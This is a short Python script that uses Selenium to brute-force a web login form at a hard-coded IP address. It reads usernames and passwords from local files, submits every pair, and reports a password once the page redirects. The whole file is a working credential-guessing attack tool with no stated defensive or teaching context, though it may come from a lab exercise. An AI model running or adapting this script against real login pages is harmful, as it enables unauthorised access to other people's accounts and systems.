from selenium import webdriver
from selenium.webdriver.common.by import By
import time

driver = webdriver.Chrome()

URL = "http://141.87.56.33:5000/login"

driver.get(URL)

password_found = False
users = []
passwords = []
with open("./users.txt", "r") as f:
    for line in f:
        users.append(line.strip())
with open("./pws.txt", "r") as f:
    for line in f:
        passwords.append(line.strip())

for user in users:
    for password in passwords:
        formElements = driver.find_elements(By.CLASS_NAME, "form-control")
        submitButton = driver.find_element(By.CLASS_NAME, "btn")
        formElements[0].clear()
        formElements[0].send_keys(user)
        formElements[1].clear()
        formElements[1].send_keys(password)
        submitButton.click()

        time.sleep(0.1)
        if URL != driver.current_url:
            print(f"Password found: {password}")
            password_found = True
            break
        else:
            print(f"Trying password: {password}")
        time.sleep(0.1)
    if password_found:
        driver.quit()
        break